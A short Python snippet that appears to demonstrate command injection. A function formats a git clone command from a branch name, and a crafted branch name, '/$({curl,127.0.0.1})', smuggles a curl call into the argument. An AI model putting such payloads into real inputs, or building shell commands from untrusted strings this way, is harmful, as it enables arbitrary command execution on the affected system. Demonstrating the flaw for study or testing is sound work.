def clone_repository(branch_name):
    command = f"git clone -b {branch_name} https://example.com/repo.git"
    print(f"Executing command: {command}")

malicious_branch_name = "/$({curl,127.0.0.1})"
clone_repository(malicious_branch_name)